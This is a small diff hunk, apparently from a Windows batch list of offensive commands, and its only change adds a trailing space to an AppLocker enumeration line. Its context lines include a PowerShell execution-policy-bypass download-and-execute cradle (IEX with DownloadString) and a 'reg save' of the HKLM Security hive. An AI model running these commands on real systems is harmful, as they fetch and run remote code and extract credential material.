@@ -438,7 +438,7 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('ht
 ECHO ============================
 subst k: %temp%
 ECHO ============================
-"powershell.exe" -nop -c "import-module applocker; get-command *applocker*
+"powershell.exe" -nop -c "import-module applocker; get-command *applocker* 
 ECHO ============================
 reg save HKLM\Security security.hive
 ECHO ============================
